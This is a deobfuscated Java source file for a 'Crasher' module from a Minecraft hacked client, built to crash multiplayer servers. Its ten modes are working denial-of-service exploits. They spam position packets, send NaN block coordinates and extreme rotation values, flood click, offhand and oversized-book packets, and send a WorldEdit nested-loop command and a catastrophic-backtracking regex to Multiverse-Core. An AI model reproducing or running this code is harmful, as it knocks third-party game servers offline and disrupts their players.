//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "G:\PortableSoft\JBY\MC_Deobf3000\1.12-MCP-Mappings"!

package me.rebirthclient.mod.modules.impl.exploit;

import me.rebirthclient.mod.modules.Category;
import me.rebirthclient.mod.modules.Module;
import me.rebirthclient.mod.modules.settings.Setting;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.client.CPacketPlayerTryUseItemOnBlock;
import net.minecraft.network.play.client.CPacketPlayer.Position;
import net.minecraft.network.play.client.CPacketPlayer.Rotation;
import net.minecraft.network.play.client.CPacketPlayerDigging.Action;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;

public class Crasher extends Module {
   private final Setting<String> packet = this.register(new Setting<>("Packets", "500"));
   public final Setting<Crasher.Mode> mode = this.add(new Setting<>("Mode", Crasher.Mode.Chunk));
   private final Setting<Boolean> logoutOff = this.add(new Setting<>("LogoutDisable", true));
   private final Setting<Boolean> autoDisable = this.add(new Setting<>("AutoDisable", false));

   public Crasher() {
      super("Crasher", "crash server", Category.EXPLOIT);
   }

   @Override
   public void onTick() {
      int packets = Integer.parseInt(this.packet.getValue());
      if (this.mode.getValue() == Crasher.Mode.Chunk) {
         for(double yPos = mc.player.posY; yPos < 255.0; yPos += 5.0) {
            mc.player.connection.sendPacket(new Position(mc.player.posX, yPos, mc.player.posZ, true));
         }

         for(double i = 0.0; i < 6685.0; i += 5.0) {
            mc.player.connection.sendPacket(new Position(mc.player.posX + i, 255.0, mc.player.posZ + i, true));
         }
      } else if (this.mode.getValue() == Crasher.Mode.Click) {
         for(int index = 0; index < packets; ++index) {
            ItemStack item = new ItemStack(mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
            CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short)1);
            mc.player.connection.sendPacket(packet);
         }
      } else if (this.mode.getValue() == Crasher.Mode.AAC) {
         for(int index = 0; index < packets; ++index) {
            mc.player
               .connection
               .sendPacket(
                  new Position(
                     mc.player.posX + (double)(9412 * index),
                     mc.player.boundingBox.minY + (double)(9412 * index),
                     mc.player.posZ + (double)(9412 * index),
                     true
                  )
               );
         }
      } else if (this.mode.getValue() == Crasher.Mode.NullPoint) {
         for(int index = 0; index < packets; ++index) {
            mc.player
               .connection
               .sendPacket(
                  new CPacketPlayerTryUseItemOnBlock(new BlockPos(Double.NaN, Double.NaN, Double.NaN), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0F, 0.0F, 0.0F)
               );
         }
      } else if (this.mode.getValue() == Crasher.Mode.Rotation) {
         mc.player.connection.sendPacket(new Rotation(9.223372E18F, 9.223372E18F, true));
      } else if (this.mode.getValue() == Crasher.Mode.WorldEdit) {
         mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}");
         this.disable();
      } else if (this.mode.getValue() == Crasher.Mode.MultiverseCore) {
         mc.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
         this.disable();
      } else if (this.mode.getValue() == Crasher.Mode.Move) {
         for(int index = 0; index < packets; ++index) {
            mc.player
               .connection
               .sendPacket(new Position(mc.player.posX, mc.player.posY + 1.0E-1, mc.player.posZ, false));
            mc.player
               .connection
               .sendPacket(new Position(mc.player.posX, mc.player.posY - 1.0E-1, mc.player.posZ, true));
         }
      } else if (this.mode.getValue() == Crasher.Mode.Offhand) {
         for(int index = 0; index < packets; ++index) {
            mc.player.connection.sendPacket(new CPacketPlayerDigging(Action.SWAP_HELD_ITEMS, BlockPos.ORIGIN, EnumFacing.UP));
            mc.player.connection.sendPacket(new CPacketPlayer(true));
         }
      } else if (this.mode.getValue() == Crasher.Mode.Book) {
         ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
         NBTTagList list = new NBTTagList();
         NBTTagCompound tag = new NBTTagCompound();

         for(int i = 0; i < 50; ++i) {
            NBTTagString tString = new NBTTagString(
               "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"
            );
            list.appendTag(tString);
         }

         tag.setString("author", "Gqrl");
         tag.setString("title", "https://wwww.baidu.com");
         tag.setTag("pages", list);
         book.setTagInfo("pages", list);
         book.setTagCompound(tag);

         for(int var13 = 0; var13 < 100 && !mc.player.isSpectator(); ++var13) {
            mc.getConnection().sendPacket(new CPacketCreativeInventoryAction(0, book));
         }
      }

      if (this.isOn() && this.autoDisable.getValue()) {
         this.disable();
      }
   }

   @Override
   public void onLogout() {
      if (this.logoutOff.getValue() && this.isOn()) {
         this.disable();
      }
   }

   @Override
   public void onLogin() {
      if (this.logoutOff.getValue() && this.isOn()) {
         this.disable();
      }
   }

   public static enum Mode {
      Chunk,
      Click,
      AAC,
      NullPoint,
      Rotation,
      WorldEdit,
      MultiverseCore,
      Move,
      Offhand,
      Book;
   }
}
